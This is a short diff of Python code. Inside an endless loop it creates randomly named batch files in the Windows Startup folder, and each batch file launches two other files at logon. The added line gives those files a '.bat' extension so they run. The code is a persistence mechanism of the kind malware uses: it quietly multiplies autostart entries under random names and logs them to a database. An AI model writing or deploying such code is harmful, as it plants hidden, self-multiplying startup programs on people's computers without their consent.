@@ -15,6 +15,7 @@ while True:
 	bat_path = f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 	for i in range(30):
 		bat_path += choice("1234567890QWERTYUIOPASDFGHJKKLZXCVBNMqwertyuiopasdfghjklzxcvbnm")
+	bat_path += ".bat"
 	with open(bat_path, "w") as bat_file:
 		bat_file.write(f"start {file_path}\nstart {file_path_2}")
 	db.add_bat_file(bat_path)
